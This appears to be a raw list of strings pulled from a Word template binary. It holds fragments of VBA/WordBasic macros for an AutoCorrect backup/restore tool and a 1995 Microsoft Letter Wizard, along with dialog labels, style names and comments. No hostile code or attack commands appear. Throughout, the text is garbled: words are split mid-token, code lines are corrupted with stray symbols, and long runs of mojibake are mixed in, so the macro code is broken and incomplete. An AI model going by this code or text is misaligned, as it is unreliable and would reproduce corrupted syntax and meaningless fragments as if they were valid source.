            "InBMMainDxoc(",
            "ument",
            "(No ",
            "C2*C",
            "Exit",
            "_NOcIN_DxOC1#b",
            "Tru%a",
            "x?eleteCmdBarA",
            ".CommanA",
            "GetCurFo@nt(rgnQ",
            "Range",
            ".Siz:9",
            "Charac!",
            "s(1)",
            "A@*v",
            "!.Styl",
            "graph",
            "ndFi",
            "l?l*",
            "t*D>",
            "sc8ripQ9i%'r",
            "eturns t$heQue -orDedireg`hry key.Io",
            "Dh& ",
            ";Fetch@f",
            ")Ida x<",
            "Null",
            "pLReg`",
            "t\\s\u04b5 ",
            "Id>M",
            "Acst",
            " emp0ty, %",
            "Defaulpo",
            "ngcQ",
            "lengPt0",
            "asn'np",
            "|d$\t]Ja",
            "' H\"~\"!a ",
            "ceholderow",
            "2' >-",
            "' WORD 9",
            "7 MINI-W IZARDa",
            "Envelope  wQSpecif0Codb",
            "C Ex",
            "' DE",
            "CLARATIO",
            "Public ",
            "Const st",
            "rWIZ_NAM",
            "E = \"H@\u02baF\"",
            "BALLOON_",
            "+2 ' ",
            "Number o",
            "f items ",
            "in Initi",
            "alBalloo",
            "n (First",
            "=1);",
            ")HEA",
            "DING",
            "?w \u03e5",
            "A_ONE_@ACCELEO",
            "C\"   '",
            "ThiDs th",
            "e form a",
            "ccelerator",
            "yR(0",
            "3TWO",
            "3e53HA",
            "1 X) As StringN@",
            "HelpTip(#",
            "SubBdWizardC",
            "s(@;",
            "NOTE:",
            " change c",
            "ant  ",
            "  if nzli",
            "/ F^menu opti",
            "0)n\u0625\u07e4^@",
            "lHM\u6900\u04a6",
            "!Ass&2h@K",
            " message",
            "WHH\u03a6",
            "\u03aa\u032cOq",
            " Microso@ft Outk",
            "Ex)\u04e4",
            "vs\t\\",
            "WCzA",
            "uCLv",
            " ziBH",
            "End !K=XK(",
            "Func!? fn9n]tnPP",
            " Err",
            "tGoToC",
            "S`yct Case",
            "< 1 'Exi",
            "ocuRt.Cl",
            "wdDoNotSaveC`$Y\t@\t Open",
            "envelopet d@or",
            "f f&OAvai",
            "lable Th",
            "Showf",
            "pp aa%.D\"",
            "Tool",
            "sCreateE9",
            ").\tK",
            "ob~j^)c",
            "tart a M!",
            " Merto~ ",
            "n,Ty%= |wd",
            "&Dy&g&f",
            "&_bP",
            "M E]C",
            "0A2' ",
            " C4 Modulbe[riv ",
            "TzSZ_MACROez",
            "RGlobal iPrev0,",
            "rscInteg",
            ":Inse",
            "rt_  Dim",
            "grapFh",
            "Fpielde",
            "A-Scre enUpd.nga`_Fals",
            "ys0.Curs`@!#",
            "Wa<n",
            "With @Oe3",
            "$((v",
            ".u,=",
            "uK( .Text",
            "r$(21)))",
            ".Move",
            "Right , 1 ",
            "o Each !",
            "0In .2",
            ".Cod",
            "FIsD0l",
            "(a$\t",
            "InStr(",
            "a$, \",\"UD",
            ")\") - 1",
            ".ID_RESET",
            "8Tru",
            "]LSkip",
            "eq\t<> `z",
            "MsgBox ",
            "0, Titlxe:=)3",
            "NA\"`",
            "Len(!')i2&  ",
            "nrHWx",
            "\t1\tA 2_{",
            "413*",
            "9Kz7gSa*, ",
            "NbcNvcN",
            "n/(A'",
            "hars) Th en",
            "= iPrevC",
            "lEnd If",
            ",With",
            "LSkip:",
            ".If (n > 32",
            "zlse",
            "R< 1",
            "qdlgDi",
            "st.IDCS_",
            "SIZE.Val\\ue",
            "IMEM$od",
            "NoControl",
            ")SetFocus",
            "lStar;",
            "Length",
            "lication",
            ".ScreenU$pd",
            "Syste",
            "m.Cursor\t",
            "Norm",
            "`ShowaExit",
            "Sub@pErro",
            "MsgBox",
            ".Descr",
            "ip#, Tit",
            "le:=SZ_M",
            "ACRONAMEL",
            " @Create@A",
            "s Intege",
            "\"Dim r",
            "Rang#",
            "OrBg",
            "para",
            "grap@",
            "cmdb",
            "CommandBar",
            "On5LGoT8o LB=C",
            "^Fa\tU^WaitC",
            " Selec?",
            "(A5= ",
            "F@&Each ",
            "8InD",
            "InSt0r(1,",
            "Chr$(13)) <> 0M",
            ".}[<",
            "H- w}E",
            "cLineBqk;iD.\tD1)s?E",
            "G!cD+ ?H\t-c",
            "ields.Count6[a$",
            "d$01A",
            "YKResize ",
            "!ine\t",
            "8' Remove AddiA",
            "al SpaceLsz\"$ ",
            "\tWhile ",
            "(Right$( ",
            ",{$F[",
            "<)  l",
            "x +@Wend",
            "'Dg a",
            " fA\"",
            "{eq \\o\\ad(foo,",
            " )}K",
            "W6P 8 (x?'",
            ".M?p",
            "{acterZ,:=xo",
            "xleteO",
            "%  .InsertAf",
            "0 \",\"",
            "g$(n, \"@\") ",
            "\")\"\t",
            "Before \"",
            "^)bYATk",
            "able",
            "r(pGrid*ys",
            " pwtQb",
            " \"?|",
            "s.39y, ",
            "{ i/%) <%'5\t{",
            "~e:tip s9",
            "`*Sm",
            "TM.ToggleaC C.",
            "LUNT",
            "Ne{#",
            "\tl_O\u07ef",
            "?\u07ef\"\u038f1R' *",
            " FIsRwh$NE=cW(7",
            "Y DB",
            " Emt",
            "1/4$",
            "32 Or A",
            "12288",
            "8197",
            "P!cD",
            "DaUD/q",
            "a;New",
            "ns Booleax",
            "= \u0611,",
            "If (.F",
            "ields.Co",
            "unt < 1)",
            " Then",
            "Create",
            " (Len(.T@ext) +",
            "\tHBeep",
            "oTo LExi",
            "0End I",
            "For Ea ch fl",
            "n 8rgn",
            "fa$L =",
            "Stet",
            "F@IsDist",
            "f= Fal<se}j",
            "cContinuee",
            ".SelectU",
            "iTop",
            "InStr(1,",
            " a$, \"(\"",
            "!tar",
            "9=x.",
            "D- *,@+1",
            "etRange $, ",
            ".MoveLef&DbNew@5?ion.B",
            "matted",
            "sableCha",
            "racterSpaceGrid@",
            "xTru",
            "Qe3R",
            "igh3",
            " , g1\".D@xt",
            "nWith",
            "#\t\u0242UpdA= ",
            "1\u0365Applic",
            "atVScree\"n",
            "ing=Sy",
            "stem.CurBs= wd",
            "NormalC",
            "%r!u SubA",
            "or]MsgBo x Err@",
            ", Ti",
            "tle:=SZ_",
            "MACRONAM",
            " Resize(",
            "|As o L",
            "Intege>rRZ",
            "WaiD8On",
            "A. 0 (c",
            "vDimj ",
            "Vt].@",
            "d|?!#dua$) Rts",
            "}|}1",
            ")N{cMxz",
            "nStr`G$(i@2",
            "Tz4n_O  MDeMd#V!MFuncAS Fsza:#",
            ")A<Boolea A?",
            "M' { e",
            "q \\o\\ad(",
            "foo@@)}#$~",
            "Ay$(\"",
            "-A5x",
            " START LOCALIZATION'C",
            "[J\u06f0\u02ae\u0565\u0621G ",
            "b\u0625\u07fc\u02e6...",
            "bxs...",
            "\u06f0\u02ae\u0565\u0633\u01a5",
            "\u06f0\u02ae\u0565u\u3db0",
            "ntWidtZ",
            "~o\u0361CznA\u0564@\u0721H",
            "~o\u0361C \udb6b\udebc\u02e6i\u09b3DC",
            "{Nq\u01a5\udb52\udd28Xxs\u06f0\u02ae\u0565\u0621A\u062be\u06f0\u02ae\u0565\u0624\u06e6PW\u066aN|QNCz\u066dn~\u0721H",
            "o\udb6b\udebc\u02e6OT\u01a5\u02e6",
            "wsJC",
            " END LOCALIZATION'",
            "***********   btnBackup_Click() ******************",
            " Hides the form, creates a new Word document, calls GetAutoCorrectEntries(), Title",
            " adds the text \"AutoCorrect Backup Document\" at the top of the document,er",
            " and saves the document by calling SaveACDoc.",
            "orma",
            " Uses valuable y that doesn't do anything.",
            "WarnMs",
            "Title)",
            "create new document",
            "   'e ",
            " call GetAutoCorrectEntries() user defined$",
            "logs(w",
            " add Text to top of document  ACFi",
            "OpC@",
            "add some formatting",
            "me) = ",
            "  ' n",
            " Save the Document,call SaveACDoc() user defined, close if successful",
            "   A ",
            "t.Cl ",
            "anges: ",
            "Endh",
            "orrect ",
            " Sub",
            "************* btnRestore_Click() **************",
            " First warns the user that this will replace their existing entries.On Err",
            " If they answer no it jumps to the end of the function.  Then displaystive",
            " the FileOpen dialog box to get the name of an existing AutoCorrect backup",
            " document (creating using the Backup button.)  Next calls OpenACDoc() to open",
            "    ",
            " the file. If successful it calls RestoreACEntries(). Finally, it closes the document.).Ro",
            "lectio",
            " warn users about replaced entries...",
            "     ",
            " Define buttons.",
            "exit",
            " bring up fileopen and get a name",
            " Open a Document,call OpenACDoc() user defined",
            "error",
            " Restore Entries, call RestoreACEntries() user defined",
            " check for correct format",
            "False",
            "\teQ`(",
            "op oi",
            "me f",
            "  ' i",
            "ment@",
            "er d`",
            "cess`(",
            "t.Cl,",
            "recti",
            "re_CP",
            " no error",
            "****** GetAutoCorrectEntries() ******",
            " Inserts each AutoCorrect entry into a Word document including the Value and whether",
            " or not it is to include formatting.  Name is the current name of the entry,",
            " Value is the text value of the entry, and RTF is a Boolean that is True if the entry",
            " has \"formatted text\" checked.  Then converts the text into a table and adds a heading row to the table.",
            " x is used to loop through the AutoCorrect entries.",
            " TotalACEntries is the number of AC entries.",
            "check for formatting and insert RTF text if necessary",
            "update status bar",
            "   Application.StatusBar = StatMsg1 & X & StatMsg2 & TotalACEntries",
            " convert to table",
            " add row heading",
            "Name",
            "Value",
            "Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext",
            "Selection.InsertBreak Type:=wdPageBreak",
            " no error",
            " cancel",
            " Define buttons.",
            " put error number and description in title of the message box",
            "bring up SaveAs again",
            " User choose No.",
            "Attribut",
            "e VB_Nam",
            "e = \"UF0",
            "l0{F4F72",
            "338-0478",
            "-11D3-89",
            "EB-00104",
            "B2921DE}",
            "Cre atabl",
            "Predecla",
            "\"Expo",
            "@Temp",
            "lateDeri",
            "%Custom$izD",
            "Op tion ",
            "' ST",
            "ART LOCA",
            "LIZATION",
            " Cons",
            "t StatMs",
            "\u06f0\u02ae\u0565\u0621G ",
            "b\u0625\u07fc@\u02e6...",
            "Ta`gText",
            "`szApp\u0144",
            " u\u3db0\t\tEr",
            "ror@6",
            "~o\u0361C",
            " \"A7i",
            "\u09b3DBC",
            "Warn",
            "{Nq0@XA>",
            "8A\u062be",
            "W\u066aN|Q@",
            "N0\u066dn",
            "0For",
            "matIncorrec",
            "V2/Re@r",
            "eCoetem",
            "sgAPw",
            "sJB<' ENDM",
            "btnBacku",
            "p_C@k() ",
            " Hid",
            "es the f11, cn ",
            "new Word",
            " documen",
            "alls GetAutoC",
            "7(),\taddU\ttJ\"",
            " BD\t\" at",
            "top ofB",
            "B\tnd sav",
            "  by c",
            "inHg S",
            "uuy`",
            "sn't",
            "yth ",
            " Sub",
            "Dim Y A",
            "s Integenrz",
            "'@pJp ,a",
            ".S`'e0nUpd",
            "\"s.Add  ",
            "- user defineB",
            "Y`Ft3!",
            "to .",
            " With SelX!a",
            "  .S",
            "Typeb",
            "Paragrapha",
            "so@\u02e1M8att1!",
            "Ac&t",
            "%!.S@Nences(1)a",
            "BolG\\ .Font.Siz14",
            "ADBK",
            ",G'G@c(@\\l@\u0180 if suc`",
            "0sful<`us8Bar-",
            " Then",
            "nges:=wd DoNoth",
            "qRShow",
            "ZAV\\",
            "IE**12dJ_E*",
            "First w'",
            "th>is",
            " will re\twce",
            "ir e(xis  ",
            "ries< ",
            "PIy0;",
            "swp.no it` jumpP",
            "dCfun#",
            "on. R",
            " di2s",
            "MFi@leOpen",
            "alog box/h ge#Hn0Havn",
            "2 (\"=+`8Q",
            ")  NAP",
            "'ts ",
            "\tf\t.",
            "AEr(). Fin",
            "Py,R",
            "}, Tit",
            "POS yng",
            "Style, ",
            "Qo{Q",
            "\" BJs aboutU",
            "vbYesNo + vbInAQ",
            "Default",
            "2 ' ;",
            "= 9v",
            "Box(szt, $",
            ";8  ')0FGodTo",
            "he:9",
            "brrr p ",
            "@+d'%Pt%",
            "MDiy's(>",
            "E)MDC+AL  G",
            "% at,\"j&M",
            "tore $~",
            "h  x`",
            "}i, NumRows,",
            "ob, oA\u01e0",
            "Objq",
            "2sz Valueo",
            "rr.CleaO",
            "check",
            "aT*\u07d0",
            "<gaat",
            "-q- oa2Yf",
            ".Coun",
            "Wiax",
            ", Which5",
            "$.MoveR",
            "ight unit",
            "Cell,q",
            ":=33",
            "\tD%=w.qK",
            "lection.",
            "MoveRigh",
            "t unit:=",
            "wdCell",
            "szRTF ",
            "= Se",
            "Tex\"t",
            "FIf ",
            "alse\" Th",
            "Appl",
            "Stat`usBar",
            "M sg1 &",
            ":oACorr",
            ".Add ",
            ":=sz",
            ", Vpalue",
            "z\\Rich",
            "s,Rang",
            "End If",
            "x Nv iG",
            "creenUpdong",
            "mTru+",
            "oBox5Res",
            "toreCompletemsg",
            "FormatxIncCw",
            "ACEntr",
            "iesError",
            "7 Ca",
            ".Number",
            "b' no e",
            "%(szK",
            "@pvbCr",
            "Descxrip",
            " GetAuto",
            ";() ",
            " Inser",
            "ts each \t",
            " eGy in",
            "to a Word docum",
            "cludiot$hef a`-whe",
            "`&' or$Ht i@",
            "e f4t`",
            "d. o i",
            "cBurnt nv of !",
            "tKvu",
            "a Boole4an",
            "has \"d",
            "ed !",
            "\" ch`ecked",
            " convB$A",
            "\" table",
            "adDds$hea\"rowa",
            "roug:h",
            " Total&I nS",
            " ACb5",
            "Private %B",
            "Dim x As`@tega]'!",
            "I{Go.M.Co",
            "uns@",
            "XWith ",
            "C[@c",
            "m .TyLpeB",
            "ia`(x).A",
            "vbTab(",
            "^'?THUb<i",
            "K@f necessary)",
            "= S'\t",
            ":=(..k+9+N",
            "}?%<s.5",
            "Paragraph",
            "he st baRK ,S",
            "4& (",
            "\\%HBE",
            "3lHome(Key\u0599Suy, Extend\u1697",
            "#CSOTo2PNSep@",
            "s, w'",
            "Si{1,L _1",
            "yBPde",
            "v=\u049d,",
            "yShaAS:J",
            "Foni",
            "ColorF",
            "BH3WRows+",
            "astP",
            "First",
            "00FA",
            "K  B",
            "Line, P:=1S\".w",
            "N\"aL\"",
            "wr/hR\"",
            "w#GoTo Wh",
            "Break ?!",
            "b`nSaveA`CDoc(lStyl",
            " po[Ynit-",
            "BOnA",
            "K !A0ve",
            "\u03e6\u03e6\u03e6CS",
            "4198\u01a8cance\u0586",
            "vbYe@sNo + Qi",
            "Defa",
            "ultButto`n2 ' ",
            ", :b",
            "spc&^' hputC ",
            "d]\u022ci",
            "\u011dmsge bo`N",
            "= Y@",
            " 'br",
            "\u041egai\u01e6",
            "' U\u0434",
            "ooPNov",
            "YC.Open.B",
            "y> ACFileQ",
            "QC.s-)",
            "CDocErro@rs",
            "ments.Op",
            "en FileName:=AC",
            "mber <> ",
            "0 Then",
            "Z = F",
            "alse",
            "En0d If",
            "\tFu nctio",
            "FindWindowA",
            "WinHelpA",
            "sid3Y",
            "WindY",
            "****i&",
            "versY",
            " Nam\u0680",
            "Atta\u0680",
            "That\u0680",
            "peCo\u0680",
            "ubli\u0680",
            ", kS\u0680",
            "OT_F\u0680",
            "Rem(",
            "s ==HD",
            "ead ",
            "DimP",
            "Rem ",
            "File@P",
            "rent@",
            "orma`",
            "   `",
            "   `",
            "ry EPN\t",
            "AddrPP\t",
            "s\" '@",
            "I is",
            "dres`^\t\t",
            ". us",
            "inesI|",
            "ry$ ",
            "ity,If\t",
            "  Ih\t",
            "\"  @j\t",
            "ingsIf\t",
            "Rem In\t",
            "$ = @j\t",
            "\"C\"Ir\t",
            " loc@",
            "ctor@",
            " sup@",
            "ame ",
            " be ",
            "tyle@",
            "rogr@\t",
            "fficP(",
            "tes ",
            "Used",
            "l co`R",
            "ff!)`T",
            "Line",
            "ug -Y$",
            "LineY`",
            "to g",
            "ver Y$",
            "e de",
            "f geY$",
            "ntro",
            "StY$",
            "gPv\t",
            "PlY$",
            "p1tePv\t",
            "ems ",
            "zQIv",
            "(&I)I~",
            "**************************************************",
            " Letter Wizard",
            " StartWizard Macro",
            " %% Copyright c 1995 Microsoft Corporation",
            "**************************************************",
            "%% Universal DLL declarations",
            "Declare Function FindWindow Lib \"user.exe\"(lpClassName$, lpWinName$) As 'Integer Alias \"FindWindow\"",
            "Declare Function WinHelp Lib \"user.exe\"(hWnd As Integer, lpHelpFile$, 'wCommand As Integer, dwData As Long) As Integer Alias \"WinHelp\" :K",
            "%% Universal shared variables %%",
            "%% Wizard-specific shared variables %%",
            "Path to prewritten business letters (LETTERS-PATH)Z ",
            "Number of letters",
            "Names of letters",
            "Filenames of letters",
            "Default category and letter",
            "DAPFEL",
            "Return Address Array (max 5)n",
            "%% Strings galore",
            "Word b\u03e5\u03aa\u033dd]w|\u0321A\u4923\uc97bFC",
            "Cletter",
            " ======== InitStrings ========",
            " Please read LocNotes before localizing!",
            " Name of wizard & document/object produced",
            "^H' @",
            "^H' B",
            "^HF' D",
            "\u04b0  D",
            "Should be name as it appears in FileNew (change if different)",
            "normal' H",
            "normal template",
            "  Page ",
            "bBJmW' |",
            "EmptyMacro ",
            "Gallery Example",
            "InsertAddress",
            "Used to check if MAPI is present",
            "MACROBUTTON ' ",
            " Default address stored as AT Entry. used to check if user has entered an address in prewritten business letters",
            "Company Name",
            "Street Address",
            "City, State/Province  Zip/Postal",
            "  bBJHa} ",
            " Fonts",
            "Arial",
            "Wingdings",
            " Misc strings",
            "FLk\u03e5\u03b2{CYnFA\u043fu\u026e\u05e1vu}s\u026e\u05e1vAA  F",
            "letters-path' P",
            "optional .ini file setting",
            " Banter strings",
            "b]w\u0724...",
            "b\u0625\u07e4...",
            "bxs]w...",
            "b\u066d]w...",
            "b\u066d\u02e6...",
            "bMH...",
            "bJH\u04f8`...",
            "M' d",
            "--> 'Looking for \"somefile.dot\"...'",
            " Style strings",
            "Company Name' ",
            "Body Text Keep' ",
            "Return Address' ",
            "Inside Address' ",
            "CC' ",
            "Enclosure",
            "Signature Name' ",
            "Salutation' ",
            "Subject Line' ",
            "Date' ",
            "Reference Initials' ",
            " == Other strings specific to this wizard ==",
            "letter' n",
            "Prefix for wizard stylesheets (eg, Letter1.dot)",
            ".dot' l",
            "Subject: ",
            "qllb/\u0467OX",
            "Dear ",
            "bBJH\udb53\udeaee' x",
            "  bBJ\u0329mW  ' v",
            "Yours truly,' ~",
            "Sincerely,' ",
            "  bBJH\u0329mWYg  ' ",
            "  bBJs",
            "\u0329mWYg  ' ",
            "Cc: ' ",
            "  bBJmW  ' ",
            "Enclosures: ' ",
            "  bBJX  ' ",
            "Attachments",
            "MMMM d, yyyy' ",
            " Measurements",
            "90pt' ",
            "72pt' ",
            "216pt",
            " Used in DoStyleMerge",
            "0.93' ",
            " Used in DoStyleMerge",
            " Error messages",
            "\u4923w]HC' ",
            "\u4923w]HC\u0430w\u02f5{",
            "Hd\u04a1C' ",
            "wizard cannot find this letter. Please choose another.\"",
            "\u4923w]HC' ",
            "F\u4923\uc9b9HA\u043f\u4966HC' ",
            "F\u4923\u02e6d' ",
            "FLk\u0625\u07ebHA]'",
            "' sbC' ",
            "JqW' ",
            "^Ha}iWLC' ",
            "InitStrings",
            "%% StartWizard Macro %%",
            "letters\\' R",
            "letters subdirectory - localize",
            "H\u01efu\\",
            "This'll take a little while",
            "Get the templates directory. The templates are supposed to be in the same directory as that of the wizard",
            "user might be creating a new template. Look at the default directory for style templates",
            "short name",
            "TPath$ = \"C:\\Program Files\\Microsoft Office\\Templates\\H\u01efu\\\"",
            " Names of templates for style merges  z",
            "{NH.dot",
            "letter1.dot",
            "M~H.dot",
            "letter3.dot",
            "\u5daeH.dot",
            "letter2.dot",
            "Used in DateTabPlace$ in CreateLetter",
            "StartWizard.DlgControl ",
            "General controls, 0-7 (hands off!)",
            "LinePic",
            "LinePicA ",
            "Workaround odd picture bug --",
            "LinePic",
            "LinePicB ",
            " use two copies to go entire width",
            "2 -- Will never be seen! (o.w. it'd always be default)",
            "(&H) ",
            "<W@B(&B)",
            "U@B(&N)>",
            "(&F) ",
            "Preview",
            "Number of general (state-independent) controls",
            "%% Wizard-specific states go here %%",
            "State 1",
            "FiH]pX\u01ba\u062b^HC ",
            "zQn@H?",
            "LetterMethod ",
            "g\u04f7~H(&B)",
            "optlm2 ",
            "gpHH(&P)",
            "optlm3 ",
            "Text1",
            "Placeholder",
            "tip1 ",
            "tip1text ",
            "Number of items in state",
            "State 2: Letter options",
            "zQN\u01f6\u0625[JH?",
            "X(&P)",
            "chkloPage",
            "(&D)",
            "chkloDate",
            "qllb\u03a4\u0467OX(&I)",
            "chkloID",
            "W(&W)",
            "chkloWriterInitials",
            "W(&T)",
            "chkloTypistInitials",
            "\u01a5(&C)",
            "chkloCC",
            "H(&E)",
            "chkloEnclosures",
            "(&A)",
            "chkloAttachments ",
            "State 3",
            "zn\u062e\u69a1H?",
            "UseLetterhead",
            "tYH(&L)",
            "LetterHeadYes",
            "tYH(&P)",
            "LetterHeadNo ",
            "State 4",
            "znNHY]pbB?",
            "LetterHeadPosition ",
            "aW(&T)",
            "AtTheTop ",
            "a(&L)",
            "OnTheLeft",
            "ak(&R)",
            "OnTheRight ",
            "HY]p\u076dnhjZ(&S)?",
            "textLetterheadSpace",
            "tip5 ",
            "tip5text ",
            "State 5",
            "JHH\u01a9\u03a5\u0473qT(&T):",
            "textRecipientAddress",
            "HHHa}(&Y):",
            "textReturnAddress",
            "qT(&A)...",
            "Push1",
            "qT(&X)...",
            "Push2",
            "State 6",
            "zQ\u03a6\u063c\u02e6?",
            "WizStyle ",
            "j\u59a1(&C) ",
            "{N(&O) ",
            "\u0437\u01e6(&T) ",
            "State 7: Finish",
            "FlagPic",
            "flag ",
            "Fw\u0625\u07ebH\udb6b\udeb8\u07f0\u077f\ufdb5!",
            "H\u0625\u07e4z\u0677Q?",
            "HelpOrEnvelope ",
            "\u0625\u07ebH\u02a9\u03b6lH(&C) ",
            "un\u072bHYi(&J) ",
            "Number of items in state",
            " Set some default values",
            "We're ready (finally!) to throw the wizard onto the screen:",
            "B@\"\t",
            "B@&\t",
            "ensure work doc is in front for tests",
            "B@*\t",
            "Close the document(w/out saving)",
            "B@*\t",
            "Close the empty doc",
            "B@\"\t",
            "B@&\t",
            "ensure work doc is in front",
            "recipAddr",
            "recipAddr",
            "B@0\t",
            "we already setup dlgEL (see below)",
            "<\tB@l",
            "@\tB@l",
            " need to print a document",
            "<\tB@D\t",
            "@\tB@",
            " need to do a WindowList(iWorkDoc) here..",
            "do nothingk",
            "letterbody ",
            "letterbody ",
            "B@0\t",
            "B@F\t",
            "H\t  H",
            "WindowNumber changes when user selects Envelops and Labels since in some languages it is opened as \"address\" and comes before empty doc.",
            "B@&\t",
            "B@*\t",
            "All done!",
            "%% StartWizard",
            "======================================================",
            "%% Wizard-specific routines",
            "LetterName ",
            "' N\t",
            "$ T\t",
            "' P\t",
            "Has this been defined in wordwiz.ini??",
            "  P\t",
            "' P\tg",
            "..How about in win.ini/winword6.ini?",
            "  P\t",
            "No, so assume they're in subdir of program directory",
            "' P\t",
            "get program directory",
            "  P\t",
            "  P\t",
            "  P\t",
            "' P\tg",
            "  P\t  R",
            "' P\t",
            "letters subdirectory  P\t",
            "  P\t  P\t",
            "' P\tg",
            "' P\t",
            "this is the best we can do",
            "  P\t",
            "  P\t",
            "' P\tg",
            "  P\t' &",
            "B@\"\t",
            "^T' b\t",
            "' b\t",
            "I' b\t",
            "pi' b\t",
            "' b\t",
            "Unknown units! ",
            "debug only",
            "inches ",
            "Unknown units! ",
            "inches ",
            "Unknown units! ",
            "t\t$ b\t",
            "' x\t",
            "  x\t",
            "' x\tg",
            "  x\t",
            "' p\t",
            " This function assumes input is in inches",
            "' |\t",
            "DAPFEL, Changed to a MacroButton",
            "MUST HAVE EmptyMacro macro in .wiz template",
            "  \t ",
            "bkAddress",
            "bkAddress",
            "If recipient address is same as default address(AT entry) then insert boilerplates",
            "textRecipientAddress ",
            "' v\t",
            "  v\t  j",
            "  v\t",
            "  v\t ",
            "not able to replace selected text with empty string. Text remains unchanged.",
            "Date ",
            "Date",
            "bkReturnAddress",
            "bkReturnAddress",
            "UseLetterhead",
            "bkReturnAddress",
            "Plain Paper",
            "Remove Paragraph mark",
            "bkCompany",
            "bkCompany",
            "UseLetterhead",
            "bkCompany",
            "Plain Paper",
            "Remove Paragraph mark",
            "UseLetterhead",
            "bkCompany",
            "bkCompany",
            "WizStyle ",
            "cntmpgfx2",
            "An extra line is introduced with the insertion of AT Entry. Does not affect Resume cover letter and letter to mom, because you do not have \"Company Name\" style",
            "Wizstyle=1",
            "bkReturnAddress",
            "WizStyle ",
            " Cntmp or Prof let style",
            "\t$ >",
            "\t$ >",
            "RetAddress...",
            "elegant style",
            "\t$ >",
            "\t$ >",
            "Do Nothingh",
            "RetAddress...",
            "get rid of last bullet?",
            "LetterHead",
            "bkName ",
            "bkName",
            "bkName2",
            "bkName2",
            "  \t ",
            "  \t ",
            "\t  \t",
            "  \t ",
            "\t  \t",
            "textRecipientAddress  \t ",
            "textReturnAddress",
            "  \t ",
            "shouldn't happen",
            "Only after getting the first MAPI load error, CommandValid (\"InsertAddress\") returns 0",
            "If error is due to MAPI loading, disable buttons",
            "SetAddress",
            "nukes extra returns in a string",
            "\t  \t",
            "  \t ",
            "\t  \t",
            "  \t' \tf",
            "Hacks in a 2nd page header/footer",
            "WizStyle ",
            "WizStyle ",
            " branch on letter type : shrinkwrapped or original",
            "textRecipientAddress ",
            "textRecipientAddress  \t$ \t",
            "textReturnAddress",
            "' B\t",
            "  B\t",
            "textReturnAddress",
            "  B\t$ \t",
            " ****************************************************",
            "chkloDate",
            "Hacks in a 2nd page header/footer",
            "chkloPage",
            "WizStyle ",
            "WizStyle ",
            "chkloPage",
            " this is code for original letters ",
            "UseLetterhead",
            "textLetterheadSpace",
            "LetterHeadPosition ",
            " at the top",
            " on the left",
            " on the right",
            "B@*\t",
            "Close the working document(w/out saving)",
            "Hey, this would be a good time to figure out where the return address/date should go:",
            "$ |\t",
            "1.25\" from the right is what?",
            "InsertPara'we're starting *after* return address/date (if included)",
            "it's not a personal letter",
            "recipaddr",
            "textRecipientAddress ",
            "includes name",
            "InsertPara  DAPFEL removedh",
            "+ DlgText$(\"textRecipientName\")",
            "recipient",
            "lenrecip = Len(kRecipient$) + 2    ' 2 for [, ]",
            "chkloID",
            "letterbody",
            "space for writer's name",
            "if not personal",
            "chkloWriterInitials",
            "chkloTypistInitials",
            "chkloTypistInitials",
            "chkloCC",
            "chkloEnclosures",
            "chkloAttachments ",
            "not personal",
            " go back to the start",
            "LetterMethod ",
            "Personal",
            "WizStyle ",
            "Contemporary Style",
            "cntmpgfx2",
            "Contemporary Style",
            "if not personal",
            "UseLetterhead",
            "WizStyle ",
            "cntmpgfx2",
            "Wizstyle=1",
            "WizStyle ",
            " Cntmp or Prof let style",
            "\t$ >",
            "\t$ >",
            "RetAddress...",
            "elegant style",
            "\t$ >",
            "\t$ >",
            "Do Nothingh",
            "RetAddress...",
            "get rid of last bullet",
            "LetterHead",
            "NotPersonal",
            "chkloDate",
            "select Company Name",
            "WizStyle ",
            "UseLetterhead",
            "cntmpgfx2",
            "WizStyle ",
            "textReturnAddress",
            "%% NextState : Determine the next state",
            "Determine state that follows oldState",
            "UseLetterhead",
            "default",
            "NextState",
            "%% PrevState : Determine the preceding state",
            "UseLetterhead",
            "Default",
            "PrevState",
            "LetterHeadPosition ",
            "' \t ",
            "%% DoButtonClick : Handle custom buttons (override standard buttons if necessary)",
            "Change value of ret when we override standard buttons (eg, \"Next\")",
            "Note: item 6 is \"Next>\"",
            "UseLetterhead",
            "force change",
            "TESTh",
            "LetterHeadPosition ",
            "textReturnAddress",
            "retaddress...",
            "state = 5",
            " FINISH",
            "HelpOrEnvelope ",
            "textRecipientAddress ",
            "textReturnAddress",
            "textRecipientAddress ",
            " This means \"return from wizard now\"",
            "DoButtonClick",
            "optlm",
            "tip1text",
            "tip1  $",
            "tip5text",
            "tip5  $",
            "LetterMethodA@2",
            "state 2",
            "chkloPage",
            "chkloDate",
            "chkloID",
            "chkloWriterInitials",
            "chkloTypistInitials",
            "chkloCC",
            "chkloEnclosures",
            "chkloAttachmentsA@2",
            "UseLetterhead",
            "LetterHeadPositionA@2",
            "textLetterheadSpace",
            "textRecipientAddressA@6",
            "textReturnAddress",
            "WizStyleA@2",
            "finish",
            "HelpOrEnvelopeA@2",
            "LetterMethod",
            " LetterMethod is id #11",
            "tip1text",
            "tip1optlm",
            "For Prewritten Letters",
            "state 2",
            "chkloPage",
            "chkloDate",
            "chkloID",
            "chkloWriterInitials",
            "chkloTypistInitials",
            "chkloCC",
            "chkloEnclosures",
            "chkloAttachments",
            "UseLetterhead",
            "LetterHeadPosition",
            "LetterHeadPosition",
            "AtTheTop' ",
            "OnTheLeft",
            "OnTheRight' ",
            "Internal error (LHP bad)  ",
            "tip5text",
            "tip5  ",
            "textLetterheadSpace",
            "$ p\t",
            "textRecipientAddress",
            "prefRecipientAddress",
            "textReturnAddress",
            "WizStyle",
            "finish",
            "HelpOrEnvelope",
            "UseLetterhead",
            "======================================",
            "LetterName ",
            "' N\t",
            "  N\t",
            "oh, goody: Mr. Resume is bossing me around again. Joy, joy.",
            "  N\t",
            "LetterMethod",
            "prewritten",
            "tip1text",
            "tip1optlm",
            "For Prewritten Letters",
            "======================================================",
            "%% Common Wizard Routines",
            "B@\"\t",
            "B@\"\t",
            "Disable ESCape (works correctly in dialog)",
            "After all that, the document may still be bogus (even if we created a new one above!)",
            "Clear it out",
            "get name of working doc's window",
            "make sure no macros are executed!",
            "create a new, empty window",
            "re-enable auto macros",
            "grab page setup options",
            "get window # of this doc",
            "find our original window",
            "B@&\t",
            "switch back to working doc ",
            "need to swap page dimensions",
            "=====================================",
            "' v\t`",
            "' v\tg",
            "  v\t",
            "windir$",
            "\\wordwiz.ini",
            "windir$",
            "\\wordwiz.ini",
            "' T\tf",
            "wordwiz.ini",
            "get the value",
            "ensure legal value (unless too big...)",
            "subscript out of range ... v is too big",
            "make sure this is turned on",
            "report the err",
            "wordwiz.ini",
